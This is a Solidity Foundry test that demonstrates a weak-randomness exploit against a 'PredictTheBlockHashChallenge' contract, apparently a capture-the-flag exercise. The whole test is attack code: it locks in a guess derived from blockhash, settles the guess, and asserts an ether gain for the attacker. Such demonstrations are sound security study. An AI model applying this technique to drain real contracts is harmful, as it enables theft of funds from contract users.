
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 2 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        
        vm.assume(blockNumber >= block.number + 2);
        vm.assume(blockNumber <= block.number + 256);

        // --- 2. State Configuration ---
        
        vm.deal(address(this), 100 ether);

        // --- 3. Replication & Assertion ---
        
        uint256 lockBlock = blockNumber - 1;
        vm.roll(lockBlock);
        
        bytes32 predictableHash = blockhash(blockNumber);
        
        _contractUnderTest.lockInGuess{value: 1 ether}(predictableHash);
        
        vm.roll(blockNumber + 1);
        
        uint256 attackerBalanceBefore = address(this).balance;
        _contractUnderTest.settle();
        uint256 attackerBalanceAfter = address(this).balance;
        
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether, "Attack succeeded using predictable blockhash");
    }
}
